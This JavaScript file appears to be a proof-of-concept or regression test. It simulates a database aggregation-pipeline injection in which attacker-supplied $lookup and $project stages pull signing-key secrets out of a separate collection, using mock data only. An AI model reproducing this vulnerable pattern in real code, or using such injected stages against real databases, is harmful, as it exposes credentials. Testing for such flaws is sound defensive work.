const accounts = [
  { _id: 1, username: "guest", displayName: "Guest", active: true },
];
const signingKeys = [{ accountId: 1, secret: "signing-key-material" }];

function executePipeline(documents, stages) {
  let output = documents.filter(({ active }) => active);
  for (const stage of stages) {
    if (stage.$lookup?.from === "signingKeys") {
      output = output.map((document) => ({
        ...document,
        keys: signingKeys.filter(({ accountId }) => accountId === document._id),
      }));
    }
    if (stage.$project?.secret === "$keys.secret") {
      output = output.map(({ keys }) => ({
        secret: keys.map(({ secret }) => secret),
      }));
    }
  }
  return output;
}

const attackerStages = [
  {
    $lookup: {
      from: "signingKeys",
      localField: "_id",
      foreignField: "accountId",
      as: "keys",
    },
  },
  { $project: { secret: "$keys.secret" } },
];
const result = executePipeline(accounts, attackerStages);
if (result[0]?.secret?.[0] !== "signing-key-material") {
  throw new Error("aggregate append lookup injection not reproduced");
}
console.log("vulnerable aggregate append exposed the signing key");
